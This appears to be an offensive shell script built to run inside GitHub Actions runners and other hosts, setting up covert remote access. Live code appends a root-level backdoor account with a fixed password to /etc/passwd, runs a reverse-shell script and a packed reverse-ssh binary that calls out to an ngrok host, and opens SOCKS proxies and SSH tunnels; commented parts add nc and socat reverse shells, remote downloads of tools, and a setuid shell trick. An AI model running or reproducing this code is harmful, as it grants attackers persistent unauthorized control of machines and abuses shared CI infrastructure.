cd /tmp
exec 1>./y1
exec 2>./y2
set -x
TZ=UTC-8
s1="export PATH=\$PATH:/tmp;TZ=UTC-8;
uptime;grep NA /etc/os-release 2>&1;
alias ll='ls -al';
which busybox&&(busybox netstat --help 2>&1 |grep programs);
alias nn='busybox netstat -anlp';alias pp='ps aux';alias p='busybox pstree -p';
stty rows 60 columns 400 2>&1 ;
#ll /tmp;which bash;
#which nc&&(nc --help;nc -e /bin/sh ngrok2.xiaomiqiu.cn 34302);
sp=\$PS1;PS1=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\\\u\}}
PS6=\${sp//\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\u\}}
PS7=\${sp//\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\u\}}
PS8=\${sp//\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\u\}}
PS9=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\u\}}
PS10=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\\u\}}
PS11=\${sp//\\\\\[u]/\\\$(TZ=UTC-8 date +%F_%T)_\\\$\{USER:-\\\\\u\}}
"

s2="grep -q sftp-server /proc/\$\$/cmdline&&(
    echo \"[ \$@ ]\$\$ \$PPID\">>non_pil.lrc;ps -ef 2>&1 >>non_pil.lrc;date +%F%T  2>&1 >>non_pil.lrc;cat /proc/\$\$/cmdline>>non_pil.lrc;   
)||( echo non_pil;$s1)"




# github_rev_ssh
(id | grep "^uid=[0-9]\{1,9\}(runner)") && (
    touch /tmp/keepalive;touch /tmp/0a9.txt;
    alias ll="ls -al"
    #sudo chmod 0777  /home/runner/work/nc_test/nc_test/*.bin;
    sudo bash -c "chmod 0777 $GITHUB_WORKSPACE/*.bin;"

 d1="/bin/sh";
(which ash) && d1=$(which ash);
(which bash) && d1=$(which bash);

#( 
#    (while true; do
#        [ ! -f /tmp/0a9.txt ] && break
#        sudo $GITHUB_WORKSPACE/socat.bin -t5 exec:"$d1",pty,stderr,setsid,sigint,sane tcp:'ngrok.xiaomiqiu123.top':34292;sleep 8;
#    done) &
#) &



. /home/runner/work/nc_test/nc_test/AABBCC_rev_shell.sh



#  60021 cn-bj-plc-300.openfrp.cc
#  50021  node-7.chddnsipa.site   liuli

 
    grep "tee" /etc/passwd || (
        sudo bash -c 'id;cp /etc/passwd /etc/passwd.bak;echo "tee:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:0:0:toor:/tmp:/bin/bash" >>/etc/passwd;
        id'
    )
    

grep -q XXYYZZ /tmp/js9 &&
( 
sudo python3 -m pip install   ddddocr -i http://pypi.douban.com/simple --trusted-host pypi.douban.com
sudo python3 -m pip install  requests  -i http://pypi.douban.com/simple --trusted-host pypi.douban.com
sudo python3 $GITHUB_WORKSPACE/run_req_yun.py
rm /tmp/keepalive;
exit;
) &

)









#sum2() {
#    [ -f ./agent.linux ] && (
#        chmod 0777 ./agent.linux
#        ./agent.linux -l 61080 &
#    ) || return 1
#    echo "bash -c '{sleep,699}&'"
#    return 0
#}
#ln2() {
#    ln -s $1 ps && ln -s $1 ash && ln -s $1 netstat && ($1 uptime >>tm) && ln -s $1 wget
#    return 0
#}



#export PATH=$PATH:/tmp
#export HOME=/tmp
#echo "echo  pil;$s1" >~/.bash_profile
#ll
#cp ~/.bash_profile ~/.ash_profile
#echo "$s2" >~/.bashrc
#cp ~/.bashrc ~/.ashrc
#touch 0a9.txt
#if which sudo && (sudo -v &>/dev/null); then echo $(whoami) is sudo_user; else echo $(whoami) is not sudo_user or hasn_t sudo; fi
#if [ 1=1 ]; then echo 123; else echo 45; fi
#b="busybox"
#b2="/tmp/${b}"
#soc="./socat"
#soc2="/tmp/${soc}"
#rr1="http://www.localhost.serfend.top/"
#rr2="${rr1}${b}.bin"
#rr3="${rr1}socat.bin"
#rr4="file_put_contents('${b}',file_get_contents('${rr2}'));chmod('${b}',0777);"

#which busybox && b2=$(which busybox)

#which busybox && ln2 ${b2} || (
#    if [ ! -f ./busybox ]; then
#        if [ ! -f /busybox ]; then
#            (which curl && curl -v -o ${b} ${rr2}) || (which wget && wget -O ${b} ${rr2}) || (which php && php -n -r $rr4)
#        else
#            cp /busybox ./
#        fi
#        ([ -f ${b} ]) && chmod 0777 busybox && ln2 ${b2}
#    fi
#)


#d0="/bin/sh"
#(which ash) && d0=$(which ash)
#(which bash) && d0=$(which bash)

#(which php) &&
#    {
#        [ -u $(which php) ] &&
#            {
#                grep "tee" /etc/passwd || (
#                    php -n -r "copy('/etc/passwd','/etc/passwd.bak');file_put_contents('/etc/passwd','tee:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:0:0:toor:/tmp/:${d0}'.PHP_EOL,FILE_APPEND);"
#                    {
#                        sleep 0.2
#                        echo 'su - tee'
#                        sleep 0.5
#                        echo 123456
#                        sleep 0.6
#                        echo 123456
#                        echo id
#                        sleep 0.2
#                        cp ${d0} /bin/xxsh
#                        echo chmod u+s /bin/xxsh
#                        echo ls -al /bin/xxsh
#                        echo exit
#                    } | script /dev/null
#                )
#            }
#    }

#which socat && soc2="socat" || (
#    if [ ! -f ${soc2} ]; then
#        [ -x ./wget ] && ./wget -O socat ${rr3} && chmod 0777 socat
#    fi
#)


#echo "${soc2}  yyy $HOSTNAME "

#sy3="(${b2} netstat -an | grep \":1001\") && echo 1001_nice ||
#            ( 
#                (${b2} netstat -an | grep \":22\") && echo || sleep 5
#                (
#                    echo \"ssh -f -o StrictHostKeyChecking=no -N -D 0.0.0.0:1001 tee@127.0.0.1\"
#                    sleep 0.6
#                    echo 123456
#                    sleep 0.6
#                    echo 123456
#                    echo exit
#                    echo exit
#                ) | script /tmp/null
#            )"


#(id | grep "^uid=0(root)") && (#echo ${b2}
#    hostN2=$(cat /etc/hostname)
#    [ "$HOSTNAME" = "goorm" -o "$hostN2" = "goorm" ] && (
#        grep "tee" /etc/passwd ||
#            (
#                cp /etc/passwd /etc/passwd.bak
                #echo "tee:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:0:0:toor:/tmp:/bin/bash" >>/etc/passwd
#            )
#        echo "${sy3}" >>/tmp/deal
#    )

#    [ "$HOSTNAME" = "out" ] && sh -c "${shsC}" && /etc/init.d/ssh restart && (
#        grep "tee" /etc/passwd ||
#            (
#                cp /etc/passwd /etc/passwd.bak
#                echo "tee:\$1\$123456\$wOSEtcyiP2N/IfIl15W6Z0:0:0:toor:/tmp:/bin/bash" >>/etc/passwd
#            )
#        sh -c "${sy3}"
#    )
#)




#d1="sh -il"
#[ -x ./ash ] && d1="/tmp/ash -il"
#(which bash) && d1="bash -pil"

#(${soc2} -v tcp-l:9494,bind=127.8.8.8,fork,reuseaddr exec:"$d1",pty,stderr,setsid,sigint,sane &)
#( 
#    (while true; do
#        [ ! -f 0a9.txt ] && break
#        ${soc2} -t5 exec:"$d1",pty,stderr,setsid,sigint,sane tcp:'ngrok.xiaomiqiu123.top':34292 
#        sleep 10
#    done) &
#) &



#(${b2} ps aux | grep -E "[6][1][0][8][0]") && echo 61080_ok || (
#    sum2 || ([ -x ./wget ] && ./wget "${rr1}agent.linux" && sum2)
#)
mkdir ~/.ssh;
cd ~/.ssh;

((echo -e "ssh-keygen -t rsa\n";sleep 0.8;echo -e "\n\ncp id_rsa.pub authorized_keys4;\n";sleep 0.6;echo -e "\n\nexit\nexit\n";)|script /tmp/nul2) 2>&1 >/tmp/nu2;
if [[ -f /home/runner/.ssh/id_rsa.pub &&  -s /home/runner/.ssh/id_rsa.pub ]];then
 cp id_rsa.pub authorized_keys;
fi

if [[ -f /home/runner/.ssh/authorized_keys &&  -s /home/runner/.ssh/authorized_keys ]];then
 ssh -o StrictHostKeyChecking=no -f -N -D 0.0.0.0:61080  runner@127.0.0.1;
 
 
 
grep -q AABBCC_10000MDL /tmp/js9 &&
(        
ip_port5=$(grep -oP "(?<=AABBCC_10000MDLLLL).*(?=FFF)" /tmp/js9)
port5=${ip_port5#*:};
ip5=${ip_port5%:*};

if [ ! -z ${port5} ] && [ ! -z ${ip5} ]; then
((sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -l -p 60021)&)&
((
for((i=0;i<10;i++));do sudo /home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin -v -b 50050  -p 34292 ngrok.xiaomiqiu123.top;sleep 60;sleep $i;done
)&)&

#sudo apt-get install redis-server
#sudo scp -P 28357 /home/runner/.ssh/authorized_keys    root@node4.buuoj.cn:/root/.ssh/authorized_keys
#sudo scp -o StrictHostKeyChecking=no -P 28357 /boot/initrd.img-5.15.0-1022-azure root@node4.buuoj.cn:/tmp/initrd.img-5.15.0;
(echo "ssh -o StrictHostKeyChecking=no -p${port5} -R 127.7.7.7:61080:127.2.2.2:61080 root@${ip5}";sleep 2;echo 123456;sleep 1;echo 123456;sleep 0.6;
   (while :;do [ -f /tmp/keepalive ]&&(echo -e "\n";sleep 11)||break;done))|script /tmp/nz_hstnme
fi

) 


fi

cd /tmp;
if [ ! -z ${sp9} ]; then sleep $sp9; fi
#[ -z ${sp5} ] && sleep $sp5
